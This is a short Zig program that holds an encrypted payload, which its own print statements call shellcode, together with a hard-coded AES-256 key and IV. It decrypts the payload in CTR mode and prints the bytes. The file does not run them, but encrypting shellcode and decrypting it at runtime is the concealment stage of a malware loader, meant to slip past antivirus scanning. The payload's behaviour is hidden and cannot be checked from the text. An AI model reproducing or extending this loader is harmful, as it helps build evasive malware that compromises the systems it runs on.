const std = @import("std");

const AES_KEY: [32]u8 = [_]u8{
    0x14, 0x8f, 0x5f, 0x22, 0x9e, 0xda, 0x8a, 0x03, 0x9e, 0x46, 0xd8, 0xc0, 0xaf, 0x64, 0x8b, 0x9e, 
    0xd1, 0xe0, 0xa7, 0x56, 0x9a, 0x69, 0xd8, 0xfe, 0x91, 0x04, 0x81, 0x00, 0xd0, 0x8c, 0xae, 0xa1
};

const AES_IV: [16]u8 = [_]u8{
    0x7f, 0x57, 0xfe, 0x24, 0xfb, 0xa4, 0x42, 0x29, 0xa9, 0x96, 0x1f, 0x16, 0x9c, 0x53, 0xeb, 0x54
};

const AES_CIPHERTEXT: [193]u8 = [_]u8{
    0x80, 0xe3, 0x35, 0xe2, 0xc0, 0x9a, 0x41, 0x6e, 0x0b, 0x2e, 0xb9, 0x17, 0x1e, 0x04, 0xb1, 0x2b, 
    0x67, 0xca, 0xe0, 0xea, 0xad, 0x88, 0x44, 0xcd, 0x7c, 0xc8, 0xe5, 0xb6, 0x73, 0x34, 0x52, 0x54, 
    0x76, 0x93, 0xf7, 0xc3, 0x1e, 0xb0, 0xd2, 0xbe, 0x62, 0x12, 0x03, 0x8e, 0x8a, 0xbc, 0x3d, 0x03, 
    0x37, 0xec, 0x84, 0x0a, 0xc8, 0xf5, 0xb0, 0xc1, 0xb1, 0x6d, 0x4d, 0x08, 0xd3, 0x39, 0xd0, 0x16, 
    0x85, 0xd8, 0xd6, 0xb2, 0x1b, 0x38, 0xba, 0xea, 0x4a, 0xea, 0xa4, 0xb0, 0x99, 0x2c, 0xc0, 0xb0, 
    0x60, 0xd2, 0xaf, 0xc0, 0x52, 0xc2, 0x4b, 0xb9, 0x93, 0xdb, 0x11, 0xa7, 0x7c, 0x78, 0xbf, 0xd8, 
    0x66, 0xbc, 0xad, 0x36, 0xe4, 0x41, 0x9a, 0x11, 0x0e, 0x60, 0x81, 0x4f, 0x47, 0xb2, 0xc4, 0x4e, 
    0x40, 0x66, 0xdc, 0x9f, 0x4e, 0xc8, 0x8c, 0xe3, 0xbe, 0x7c, 0xfb, 0x9a, 0xa0, 0xab, 0x27, 0x7d, 
    0xd0, 0x92, 0x58, 0x59, 0x72, 0xdc, 0x0c, 0x3c, 0x20, 0x63, 0x25, 0x3d, 0xf4, 0x05, 0x6c, 0x55, 
    0x06, 0x05, 0xda, 0x0a, 0x6a, 0x96, 0xd9, 0x24, 0x93, 0xe5, 0x53, 0x87, 0x7e, 0x33, 0xd0, 0xa1, 
    0x33, 0x5c, 0x8b, 0x69, 0xe1, 0xa1, 0x0f, 0x56, 0x34, 0x93, 0x9a, 0x96, 0x8f, 0x2e, 0x7c, 0x6b, 
    0x25, 0x19, 0x37, 0x24, 0x8d, 0x55, 0x9c, 0x34, 0xcf, 0x64, 0x13, 0x84, 0xc2, 0xb7, 0x98, 0x48, 
    0x9f
};

fn aesDecryption(ciphertext: []u8, key: []const u8, iv: []const u8) !void {
    switch (key.len) {
        16 => {
            const key_array: [16]u8 = key[0..16].*;
            const ctx = std.crypto.core.aes.Aes128.initEnc(key_array);
            try aesDecryptWithContext(ciphertext, ctx, iv);
        },
        32 => {
            const key_array: [32]u8 = key[0..32].*;
            const ctx = std.crypto.core.aes.Aes256.initEnc(key_array);
            try aesDecryptWithContext(ciphertext, ctx, iv);
        },
        else => return error.InvalidKeyLength,
    }
}

fn aesDecryptWithContext(data: []u8, ctx: anytype, iv: []const u8) !void {
    // CTR mode decryption is same as encryption
    var counter: [16]u8 = undefined;
    @memcpy(&counter, iv);

    var offset: usize = 0;
    while (offset < data.len) {
        var keystream: [16]u8 = undefined;
        ctx.encrypt(&keystream, &counter);

        const block_size = @min(16, data.len - offset);
        for (0..block_size) |i| {
            data[offset + i] ^= keystream[i];
        }

        // Increment counter
        var carry: u16 = 1;
        var i: usize = 15;
        while (carry > 0 and i < 16) {
            carry += counter[i];
            counter[i] = @intCast(carry & 0xFF);
            carry >>= 8;
            if (i == 0) break;
            i -= 1;
        }

        offset += block_size;
    }
}

pub fn main() !void {
    var ciphertext = AES_CIPHERTEXT;
    try aesDecryption(&ciphertext, &AES_KEY, &AES_IV);
    std.debug.print("Decrypted shellcode length: {}\n", .{ciphertext.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{ciphertext});
}
